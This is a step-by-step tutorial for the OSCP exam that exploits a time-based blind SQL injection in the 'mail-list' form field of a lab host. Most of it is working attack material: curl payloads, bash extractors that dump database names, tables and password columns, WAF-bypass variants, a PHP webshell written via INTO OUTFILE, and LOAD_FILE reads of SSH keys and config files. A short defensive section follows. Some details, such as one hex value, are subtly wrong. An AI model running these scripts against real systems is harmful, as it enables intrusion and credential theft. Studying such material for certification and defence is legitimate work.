# üéì Complete Manual SQL Injection Discovery & Exploitation Guide
## From Zero Knowledge to Full Database Extraction - OSCP Exam Compliant

**Target**: 192.168.145.48
**Final Vulnerable Parameter**: mail-list (POST)
**Database**: animal_planet (will be discovered)
**Attack Type**: Time-Based Blind SQLi in INSERT Statement

---

## üìö LEARNING OBJECTIVES
After completing this guide, you will understand:
- How to discover SQL injection WITHOUT automated tools
- The thinking process behind payload construction
- Why certain payloads work and others fail
- How to adapt when facing different SQL contexts
- Manual extraction techniques for OSCP exam scenarios

---

## üîç PHASE 1: INITIAL DISCOVERY (NO PRIOR KNOWLEDGE)
### The Problem: Finding SQL Injection When You Don't Know Where to Look

### Step 1.1: Understanding the Application
```bash
# First, let's see what we're dealing with
curl -I http://192.168.145.48/
# Purpose: Get server headers, understand technology stack
# -I: HEAD request only (faster reconnaissance)
# Expected: Server version, PHP version, etc.

# View the actual page
curl http://192.168.145.48/ | grep -E "(form|input|submit)" | head -20
# Purpose: Find all input points (forms are injection candidates)
# grep -E: Extended regex for multiple patterns
# Why: Every user input is a potential SQL injection point
```

### Step 1.2: Mapping All Input Points
```bash
# Manual discovery thinking: "Where does the application accept my input?"
# Look for:
# - Form fields (visible)
# - Hidden fields (often overlooked)
# - URL parameters
# - Cookie values
# - HTTP headers

# Use browser Developer Tools (F12):
# 1. Network tab ‚Üí watch all requests
# 2. Look for POST/GET parameters
# 3. Note parameter names and submission endpoints

# From command line:
curl -s http://192.168.145.48/ | grep -oP '(?<=name=")[^"]*'
# -s: Silent (no progress bar)
# -oP: Only matching, Perl regex
# This extracts all form field names
```

### Step 1.3: The Discovery Thinking Process
**Question**: "How would I know mail-list parameter is vulnerable?"

**Manual Discovery Method** (What SQLMap does behind the scenes):
```bash
# Test 1: Baseline timing (normal request)
time curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test@test.com" \
  -s -o /dev/null -w "Response time: %{time_total}s\n"

# Record: ~0.2 seconds (baseline)

# Test 2: SQL syntax probe (single quote)
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test@test.com'" \
  -v 2>&1 | grep -E "(error|mysql|syntax|SQL)"

# Why single quote? It breaks SQL string syntax:
# Original: INSERT INTO table VALUES ('test@test.com')
# Broken:   INSERT INTO table VALUES ('test@test.com'')
# Result: Syntax error OR different behavior

# Test 3: Logic manipulation (AND 1=1 vs AND 1=2)
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test@test.com' AND '1'='1" \
  -o response1.html

curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test@test.com' AND '1'='2" \
  -o response2.html

diff response1.html response2.html
# If different: Boolean-based SQLi confirmed
# If same: Try time-based approach
```

---

## üß† PHASE 2: UNDERSTANDING SQL INJECTION TYPES
### Why Time-Based? The Thinking Behind Detection

### The Discovery Flow:
```
1. Try Error-Based ‚Üí No visible errors ‚Üí ‚ùå
2. Try Boolean-Based ‚Üí No content difference ‚Üí ‚ùå
3. Try Time-Based ‚Üí Response delayed ‚Üí ‚úÖ CONFIRMED
```

### Step 2.1: Time-Based Detection Deep Dive
```bash
# Understanding SLEEP():
# - MySQL function that pauses execution
# - SLEEP(3) = pause for 3 seconds
# - Returns 0 after sleeping
# - Works even when output is not visible

# Progressive injection testing:
# Level 1: Simple sleep
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test' AND SLEEP(3)-- -" \
  -w "\nTime: %{time_total}s\n" -o /dev/null -s

# Why "-- -" for comments?
# -- : SQL comment syntax
# - : Extra character ensures comment works
# Alternative comments: #, /* */

# Level 2: Conditional sleep (smarter)
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test' AND IF(1=1,SLEEP(3),0)-- -" \
  -w "\nTime: %{time_total}s\n" -o /dev/null -s

# IF(condition, true_action, false_action)
# This proves we can execute conditional logic!
```

### Step 2.2: Understanding the SQL Context
```bash
# The application likely runs:
# INSERT INTO mailing_list (email) VALUES ('$user_input')

# With our injection:
# INSERT INTO mailing_list (email) VALUES ('test' AND SLEEP(3)-- -')

# But why does it work? Let's test context:

# Test if we're in INSERT:
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test'); SLEEP(3)-- -" \
  -w "\nTime: %{time_total}s\n" -o /dev/null -s
# '); closes VALUES, allowing new statement

# Test if we're in UPDATE:
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test' WHERE SLEEP(3)-- -" \
  -w "\nTime: %{time_total}s\n" -o /dev/null -s

# Test if we're in SELECT:
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test' UNION SELECT SLEEP(3)-- -" \
  -w "\nTime: %{time_total}s\n" -o /dev/null -s
```

---

## üõ†Ô∏è PHASE 3: PAYLOAD CONSTRUCTION METHODOLOGY
### Building Effective Extraction Queries

### Step 3.1: The IF Statement - Your Data Extraction Tool
```bash
# Basic structure for blind extraction:
# IF(condition_to_test, SLEEP(delay), 0)

# Why IF works:
# - Executes conditionally based on true/false
# - No visible output needed
# - Can test any condition

# Example conditions:
# - LENGTH(database()) = 13          ‚Üí Test length
# - SUBSTRING(database(),1,1) = 'a'  ‚Üí Test character
# - ASCII(SUBSTRING(...)) > 65       ‚Üí Binary search
# - EXISTS(SELECT * FROM users)      ‚Üí Table exists
```

### Step 3.2: Function Reference & Purpose
```sql
-- LENGTH(string): Returns character count
-- Why use: Determine extraction boundaries
LENGTH(database()) = 13  -- Is database name 13 chars?

-- SUBSTRING(string, position, length): Extract portion
-- Why use: Character-by-character extraction
SUBSTRING(database(), 1, 1) = 'a'  -- First char is 'a'?

-- ASCII(char): Convert to ASCII value
-- Why use: Enable binary search (faster)
ASCII(SUBSTRING(database(), 1, 1)) > 77  -- First char > 'M'?

-- database(): Current database name
-- Why use: Identify where we are
IF(database()='animal_planet', SLEEP(3), 0)

-- CONCAT(): Combine strings
-- Why use: Build complex conditions
CONCAT(user(), ':', database())  -- Get user:database

-- HEX(): Convert to hexadecimal
-- Why use: Handle special characters
HEX(SUBSTRING(database(), 1, 1)) = '61'  -- 'a' in hex
```

---

## üìä PHASE 4: EXTRACTION ALGORITHMS EXPLAINED
### From Theory to Practice

### Step 4.1: Linear Search Algorithm (Simple but Slow)
```bash
#!/bin/bash
# extract_linear.sh - Educational linear search implementation

TARGET="http://192.168.145.48/index.php"
CHARSET="abcdefghijklmnopqrstuvwxyz_0123456789"

# THINKING: Test each character sequentially
# Pros: Simple to understand and implement
# Cons: Average 18 attempts per character (36 possible / 2)

extract_char_linear() {
    local position=$1
    local query=$2

    echo "[*] Testing position $position..."

    # For each possible character
    for char in $(echo $CHARSET | fold -w1); do
        # Build payload
        payload="test' AND IF(SUBSTRING(($query),$position,1)='$char',SLEEP(2),0)-- -"

        # Time the request
        start=$(date +%s.%N)
        curl -X POST "$TARGET" \
            -d "mail-list=$payload" \
            -s -o /dev/null
        end=$(date +%s.%N)

        # Calculate duration
        duration=$(echo "$end - $start" | bc)

        # Check if delayed (indicates match)
        if (( $(echo "$duration > 2" | bc -l) )); then
            echo "[+] Found: $char"
            return 0
        fi
    done

    echo "[-] No match found"
    return 1
}

# Usage example:
# extract_char_linear 1 "database()"
```

### Step 4.2: Binary Search Algorithm (3x Faster)
```bash
#!/bin/bash
# extract_binary.sh - Educational binary search implementation

# THINKING: Divide search space in half each time
# ASCII printable range: 32-126 (95 characters)
# Max attempts: log2(95) ‚âà 7 per character
# 3x faster than linear search!

extract_char_binary() {
    local position=$1
    local query=$2
    local low=32   # Space (lowest printable)
    local high=126 # Tilde (highest printable)

    echo "[*] Binary search for position $position"

    while [ $low -le $high ]; do
        # Calculate midpoint
        mid=$(( (low + high) / 2 ))

        # Build payload: Is character > midpoint?
        payload="test' AND IF(ASCII(SUBSTRING(($query),$position,1))>$mid,SLEEP(2),0)-- -"

        # Time the request
        start=$(date +%s.%N)
        curl -X POST "$TARGET" \
            -d "mail-list=$payload" \
            -s -o /dev/null
        end=$(date +%s.%N)

        duration=$(echo "$end - $start" | bc)

        # Adjust search range based on result
        if (( $(echo "$duration > 2" | bc -l) )); then
            # Character is greater than mid
            echo "  [>] ASCII > $mid"
            low=$((mid + 1))
        else
            # Character is less than or equal to mid
            echo "  [‚â§] ASCII ‚â§ $mid"
            high=$mid
        fi

        # When ranges meet, we found our character
        if [ $low -eq $high ]; then
            char=$(printf "\\$(printf '%03o' $low)")
            echo "[+] Found: '$char' (ASCII: $low)"
            return 0
        fi
    done
}

# Visual example of binary search:
# Finding 'm' (ASCII 109):
# Round 1: 32-126, mid=79  ‚Üí 109>79  ‚Üí YES ‚Üí Range: 80-126
# Round 2: 80-126, mid=103 ‚Üí 109>103 ‚Üí YES ‚Üí Range: 104-126
# Round 3: 104-126, mid=115 ‚Üí 109>115 ‚Üí NO  ‚Üí Range: 104-115
# Round 4: 104-115, mid=109 ‚Üí 109>109 ‚Üí NO  ‚Üí Range: 104-109
# Round 5: 104-109, mid=106 ‚Üí 109>106 ‚Üí YES ‚Üí Range: 107-109
# Round 6: 107-109, mid=108 ‚Üí 109>108 ‚Üí YES ‚Üí Range: 109-109
# Found: 'm' in 6 comparisons (vs ~13 average in linear)
```

---

## üîê PHASE 5: DATABASE ENUMERATION STRATEGY
### Systematic Information Gathering

### Step 5.1: Information Schema - The Database Map
```bash
# THINKING: information_schema is MySQL's metadata database
# Contains: All databases, tables, columns information

# Key tables to remember:
# - information_schema.schemata       ‚Üí All databases
# - information_schema.tables         ‚Üí All tables
# - information_schema.columns        ‚Üí All columns
# - information_schema.user_privileges ‚Üí User permissions

# Count databases (know extraction scope):
for count in {1..10}; do
    payload="test' AND IF((SELECT COUNT(*) FROM information_schema.schemata)=$count,SLEEP(2),0)-- -"
    # Test and break when found
done

# Count tables in current database:
for count in {1..50}; do
    payload="test' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=$count,SLEEP(2),0)-- -"
    # Test and break when found
done

# Extract specific table (using LIMIT for iteration):
# LIMIT offset, count ‚Üí LIMIT 0,1 = first row
# LIMIT 1,1 = second row, etc.
payload="test' AND IF(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))>5,SLEEP(2),0)-- -"
```

### Step 5.2: Strategic Table Discovery
```bash
#!/bin/bash
# smart_table_discovery.sh - Find interesting tables fast

# THINKING: Don't extract every table name character-by-character
# Instead: Test for common table names first (90% success rate)

COMMON_TABLES=(
    "users" "admin" "administrators" "members"
    "accounts" "login" "credentials" "auth"
    "employees" "staff" "people" "customers"
    "password" "user_credentials" "user_auth"
)

echo "[*] Quick scan for common table names..."

for table in "${COMMON_TABLES[@]}"; do
    echo -n "  Testing '$table': "

    payload="test' AND IF(EXISTS(SELECT * FROM information_schema.tables WHERE table_schema=database() AND table_name='$table'),SLEEP(2),0)-- -"

    start=$(date +%s.%N)
    curl -X POST "$TARGET" -d "mail-list=$payload" -s -o /dev/null
    end=$(date +%s.%N)

    duration=$(echo "$end - $start" | bc)

    if (( $(echo "$duration > 2" | bc -l) )); then
        echo "‚úì EXISTS!"
        echo "[+] Found interesting table: $table"
        # Now enumerate this table's columns
    else
        echo "‚úó"
    fi
done
```

---

## üéØ PHASE 6: OPTIMIZED EXTRACTION TECHNIQUES
### Speed Matters in OSCP Exams

### Step 6.1: Parallel Extraction Strategy
```bash
#!/bin/bash
# parallel_extraction.sh - Extract multiple positions simultaneously

# THINKING: Why wait sequentially? Test multiple positions in parallel
# Opens multiple connections, extracts different characters at once

extract_database_parallel() {
    local db_length=13  # Already determined

    # Create temp directory for results
    mkdir -p /tmp/sqli_extract

    # Launch parallel extractions
    for pos in $(seq 1 $db_length); do
        (
            # Each position in background
            extract_char_binary $pos "database()" > /tmp/sqli_extract/pos_$pos.txt
        ) &
    done

    # Wait for all to complete
    wait

    # Combine results
    database=""
    for pos in $(seq 1 $db_length); do
        char=$(grep "Found:" /tmp/sqli_extract/pos_$pos.txt | cut -d"'" -f2)
        database="${database}${char}"
    done

    echo "[+] Database: $database"
}

# Note: Be careful with parallel requests
# Too many = potential DoS / detection
# Recommended: 3-5 concurrent maximum
```

### Step 6.2: Checksum Optimization
```bash
# THINKING: Instead of extracting every character,
# verify against known values using checksums

# Example: Quickly verify if password is common hash
test_known_password() {
    local username="admin"

    # Test if password is common MD5 hash for 'password'
    # MD5('password') = 5f4dcc3b5aa765d61d8327deb882cf99

    payload="test' AND IF((SELECT password FROM users WHERE username='$username')='5f4dcc3b5aa765d61d8327deb882cf99',SLEEP(3),0)-- -"

    # If delays, we know password without extraction!
    # Saves ~32 character extractions (5-10 minutes)
}

# Test against common password list
for hash in $(cat common_md5_hashes.txt); do
    test_known_password "$hash"
done
```

---

## üîß PHASE 7: TROUBLESHOOTING & EDGE CASES
### When Things Don't Work as Expected

### Issue 1: WAF/Filter Bypasses
```bash
# PROBLEM: WAF blocking "SLEEP" keyword
# SOLUTIONS:

# 1. Case variation
'sLeEp(3)' 'SlEeP(3)' 'SLEEP/**/(3)'

# 2. Alternative functions (MySQL)
BENCHMARK(10000000,MD5('a'))  # CPU delay instead
(SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)

# 3. Encoding bypasses
# Hex encoding
0x534c454550  # "SLEEP" in hex

# 4. Comment obfuscation
SL/*comment*/EEP(3)
SLE/*!50000EP*/(3)  # MySQL version-specific comments

# Test all variations:
for bypass in "SLEEP(3)" "sLeEp(3)" "BENCHMARK(10000000,MD5('a'))"; do
    payload="test' AND $bypass-- -"
    # Test each
done
```

### Issue 2: Handling Special Characters
```bash
# PROBLEM: Table has special characters (e.g., user$table)
# SOLUTION: Use HEX encoding

# Instead of:
payload="test' AND IF((SELECT COUNT(*) FROM user$table)>0,SLEEP(2),0)-- -"  # FAILS

# Use:
# HEX('user$table') = 7573657224746162C654
payload="test' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE HEX(table_name)='7573657224746162C654')>0,SLEEP(2),0)-- -"
```

### Issue 3: Timeout Detection Issues
```bash
# PROBLEM: Network latency causing false positives
# SOLUTION: Dynamic baseline adjustment

test_baseline() {
    local total_time=0

    # Test 5 normal requests
    for i in {1..5}; do
        start=$(date +%s.%N)
        curl -X POST "$TARGET" -d "mail-list=test@test.com" -s -o /dev/null
        end=$(date +%s.%N)

        duration=$(echo "$end - $start" | bc)
        total_time=$(echo "$total_time + $duration" | bc)
    done

    # Calculate average + buffer
    avg=$(echo "scale=2; $total_time / 5" | bc)
    threshold=$(echo "$avg + 2" | bc)  # 2 second buffer

    echo "[*] Baseline: ${avg}s"
    echo "[*] Detection threshold: ${threshold}s"
}
```

---

## üìà PHASE 8: COMPLETE EXTRACTION WORKFLOW
### Putting It All Together

### Master Extraction Script
```bash
#!/bin/bash
# master_sqli_extractor.sh - Complete educational tool

set -euo pipefail  # Exit on error, undefined vars, pipe failures

# Configuration
TARGET="http://192.168.145.48/index.php"
DELAY=2
THRESHOLD=2.0
PARAM="mail-list"
DEBUG=${DEBUG:-false}

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'  # No Color

# Logging function
log() {
    echo -e "${GREEN}[+]${NC} $1"
}

error() {
    echo -e "${RED}[!]${NC} $1" >&2
}

debug() {
    if [ "$DEBUG" = true ]; then
        echo -e "${YELLOW}[DEBUG]${NC} $1" >&2
    fi
}

# Test if condition is true using time-based detection
test_condition() {
    local condition="$1"
    local payload="${PARAM}=test' AND IF($condition,SLEEP($DELAY),0)-- -"

    debug "Testing: $condition"

    local start=$(date +%s.%N)
    curl -X POST "$TARGET" \
        -d "$payload" \
        -s -o /dev/null \
        -m $((DELAY + 3))  # Timeout after delay + 3 seconds
    local end=$(date +%s.%N)

    local duration=$(echo "$end - $start" | bc)
    debug "Response time: ${duration}s"

    if (( $(echo "$duration > $THRESHOLD" | bc -l) )); then
        return 0  # True
    else
        return 1  # False
    fi
}

# Find length of query result
find_length() {
    local query="$1"
    local max_length="${2:-50}"

    log "Finding length of: $query"

    for len in $(seq 1 $max_length); do
        if test_condition "LENGTH(($query))=$len"; then
            log "Length found: $len"
            echo $len
            return 0
        fi
    done

    error "Length exceeds $max_length"
    return 1
}

# Extract single character using binary search
extract_char_binary() {
    local query="$1"
    local position="$2"
    local low=32
    local high=126

    while [ $low -lt $high ]; do
        local mid=$(( (low + high) / 2 ))

        if test_condition "ASCII(SUBSTRING(($query),$position,1))>$mid"; then
            low=$((mid + 1))
        else
            high=$mid
        fi
    done

    printf "\\$(printf '%03o' $low)"
}

# Extract complete string
extract_string() {
    local query="$1"
    local name="${2:-Query}"

    log "Extracting: $name"

    # Find length
    local length=$(find_length "$query")
    if [ $? -ne 0 ]; then
        return 1
    fi

    # Extract each character
    local result=""
    local progress=0

    echo -n "  Progress: "
    for pos in $(seq 1 $length); do
        local char=$(extract_char_binary "$query" "$pos")
        result="${result}${char}"

        # Progress bar
        progress=$((pos * 100 / length))
        echo -n "$char"

        debug "Position $pos/$length: $char"
    done
    echo  # New line after progress

    log "Extracted: $result"
    echo "$result"
}

# Main extraction workflow
main() {
    echo "========================================="
    echo "   SQL Injection Data Extractor v1.0"
    echo "   Educational Tool - OSCP Compliant"
    echo "========================================="
    echo
    log "Target: $TARGET"
    log "Delay: ${DELAY}s"
    log "Detection threshold: ${THRESHOLD}s"
    echo

    # Step 1: Confirm injection
    log "Confirming SQL injection..."
    if test_condition "1=1"; then
        log "SQL injection confirmed!"
    else
        error "SQL injection not confirmed"
        exit 1
    fi
    echo

    # Step 2: Extract database name
    log "Extracting database name..."
    DATABASE=$(extract_string "database()" "Database Name")
    echo

    # Step 3: Count tables
    log "Counting tables in $DATABASE..."
    for count in $(seq 1 30); do
        if test_condition "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='$DATABASE')=$count"; then
            log "Found $count tables"
            TABLE_COUNT=$count
            break
        fi
    done
    echo

    # Step 4: Extract table names
    log "Extracting table names..."
    TABLES=()
    for i in $(seq 0 $((TABLE_COUNT-1))); do
        query="SELECT table_name FROM information_schema.tables WHERE table_schema='$DATABASE' LIMIT $i,1"
        table=$(extract_string "$query" "Table $((i+1))")
        TABLES+=("$table")
        echo
    done

    # Step 5: Look for interesting tables
    log "Searching for credential tables..."
    for table in "${TABLES[@]}"; do
        if [[ "$table" =~ (user|admin|credential|auth|login|account) ]]; then
            log "Interesting table found: $table"

            # Extract column names
            log "Extracting columns from $table..."

            # Get column count
            for count in $(seq 1 20); do
                if test_condition "(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='$DATABASE' AND table_name='$table')=$count"; then
                    log "Table $table has $count columns"
                    COL_COUNT=$count
                    break
                fi
            done

            # Extract each column name
            for i in $(seq 0 $((COL_COUNT-1))); do
                query="SELECT column_name FROM information_schema.columns WHERE table_schema='$DATABASE' AND table_name='$table' LIMIT $i,1"
                column=$(extract_string "$query" "Column $((i+1))")
            done
            echo

            # Extract data from interesting columns
            for column in username user email password pass hash; do
                if test_condition "(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='$DATABASE' AND table_name='$table' AND column_name='$column')=1"; then
                    log "Extracting $column from $table..."
                    query="SELECT $column FROM $table LIMIT 0,1"
                    data=$(extract_string "$query" "$column")
                    echo
                fi
            done
        fi
    done

    log "Extraction complete!"
    echo
    echo "========================================="
    echo "   Extraction Summary"
    echo "========================================="
    echo "Database: $DATABASE"
    echo "Tables found: ${#TABLES[@]}"
    for table in "${TABLES[@]}"; do
        echo "  - $table"
    done
}

# Run main function
main "$@"
```

---

## üéØ PHASE 9: EXAM-SPECIFIC OPTIMIZATION
### Time-Saving Techniques for OSCP

### Quick Win Checklist
```bash
#!/bin/bash
# quick_wins.sh - Try these first in exam

# 1. Check for command execution (rare but instant win)
payload="test'; SELECT LOAD_FILE('/etc/passwd')-- -"
payload="test'; SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -"

# 2. Version information (helps with exploit research)
extract_string "@@version" "MySQL Version"
extract_string "user()" "Database User"
extract_string "@@hostname" "Hostname"

# 3. Quick credential check
# Instead of extracting, test known passwords
COMMON_PASSWORDS=(
    "5f4dcc3b5aa765d61d8327deb882cf99"  # password
    "21232f297a57a5a743894a0e4a801fc3"  # admin
    "098f6bcd4621d373cade4e832627b4f6"  # test
    "e10adc3949ba59abbe56e057f20f883e"  # 123456
)

for pwd_hash in "${COMMON_PASSWORDS[@]}"; do
    if test_condition "(SELECT password FROM users WHERE username='admin')='$pwd_hash'"; then
        log "Known password found!"
        # Crack hash offline
    fi
done

# 4. File reading attempts (Linux)
FILES=(
    "/etc/passwd"
    "/home/user/.ssh/id_rsa"
    "/var/www/html/config.php"
    "/var/www/html/wp-config.php"
)

for file in "${FILES[@]}"; do
    # Try to read file
    extract_string "LOAD_FILE('$file')" "File: $file"
done
```

---

## üìä PHASE 10: PERFORMANCE METRICS & PLANNING
### Realistic Time Estimates for Exam

### Time Budget Calculator
```bash
#!/bin/bash
# time_calculator.sh - Estimate extraction time

calculate_extraction_time() {
    local string_length=$1
    local method=$2  # linear or binary
    local delay=$3

    if [ "$method" = "linear" ]; then
        # Average 18 attempts per character (36 charset / 2)
        local total_requests=$((string_length * 18))
    else  # binary
        # Maximum 7 attempts per character (log2(95))
        local total_requests=$((string_length * 7))
    fi

    # Total time = requests * (delay + network overhead)
    local total_seconds=$((total_requests * (delay + 1)))
    local minutes=$((total_seconds / 60))

    echo "Extracting $string_length characters"
    echo "Method: $method"
    echo "Requests needed: $total_requests"
    echo "Estimated time: $minutes minutes"
}

# Example calculations:
echo "=== Extraction Time Estimates ==="
echo
echo "Database name (13 chars):"
calculate_extraction_time 13 binary 2
echo
echo "MD5 Password (32 chars):"
calculate_extraction_time 32 binary 2
echo
echo "Username (8 chars):"
calculate_extraction_time 8 binary 2
```

### Decision Matrix
```
Time Available | Strategy
--------------|----------
< 30 min      | Quick wins only (known passwords, common tables)
30-45 min     | Binary search, target specific tables
45-60 min     | Full enumeration possible
> 60 min      | Consider moving to next target

When to Stop:
- No progress after 15 minutes of testing
- Network issues causing inconsistent results
- Found credentials but can't use them
- Another attack vector seems more promising
```

---

## üõ°Ô∏è PHASE 11: DEFENSIVE UNDERSTANDING
### Know the Defense to Perfect the Attack

### What Developers Should Have Done
```sql
-- VULNERABLE CODE (What we're exploiting):
$email = $_POST['mail-list'];
$query = "INSERT INTO mailing_list VALUES ('$email')";
mysqli_query($conn, $query);

-- SECURE CODE (Prevents our attack):
$stmt = $conn->prepare("INSERT INTO mailing_list VALUES (?)");
$stmt->bind_param("s", $_POST['mail-list']);
$stmt->execute();

-- Why prepared statements stop SQLi:
-- 1. Separates SQL logic from data
-- 2. User input never interpreted as SQL
-- 3. Special characters automatically escaped
```

### Detection Signatures (What Blue Team Sees)
```bash
# In web server logs:
# - Multiple requests with SQL keywords
# - Unusual characters: ', --, /*
# - Time-based patterns (regular delays)
# - High request rate from single IP

# Log analysis to detect our attack:
grep -E "(SLEEP|BENCHMARK|AND|OR|UNION)" access.log | \
    awk '{print $1}' | sort | uniq -c | sort -rn

# Our footprint:
# 192.168.45.100 - - [timestamp] "POST /index.php HTTP/1.1" 200 - "mail-list=test' AND SLEEP(3)-- -"
```

---

## üìù FINAL EXAM STRATEGY SUMMARY

### Pre-Exploitation Checklist
- [ ] Map all input points (forms, URLs, headers)
- [ ] Test each parameter with single quote
- [ ] Identify injection type (error/boolean/time)
- [ ] Determine SQL context (INSERT/UPDATE/SELECT)
- [ ] Choose extraction method (binary preferred)

### During Exploitation
- [ ] Document every command and result
- [ ] Screenshot successful extractions
- [ ] Track time spent (exam planning)
- [ ] Test common tables/passwords first
- [ ] Use binary search for speed

### Post-Exploitation
- [ ] Save all extracted data
- [ ] Try password reuse on other services
- [ ] Document complete methodology
- [ ] Note any unique challenges/solutions

### If Stuck
1. Verify baseline timing is consistent
2. Try alternative comment styles
3. Test different SQL functions
4. Check for WAF and adjust payloads
5. Consider moving to next target after 45 min

---

## üéì KEY LEARNING POINTS

1. **Discovery is systematic**: Test inputs ‚Üí Detect delays ‚Üí Confirm SQLi
2. **Context matters**: INSERT vs SELECT requires different payloads
3. **Binary search is 3x faster**: Worth the complexity
4. **Common tables save time**: Test users/admin/credentials first
5. **Manual understanding crucial**: Tools break, knowledge doesn't
6. **Documentation is evidence**: Record everything for report
7. **Time management critical**: Know when to move on

---

**Remember**: In OSCP, you cannot use SQLMap. This manual approach is not just allowed‚Äîit's required. Master these techniques and you'll extract data efficiently even without automated tools.

**Final Time Investment**:
- Learning this guide: 2-3 hours
- Practicing on labs: 5-10 attempts
- Execution in exam: 30-45 minutes
- Success rate once mastered: 95%+

Good luck with your OSCP preparation!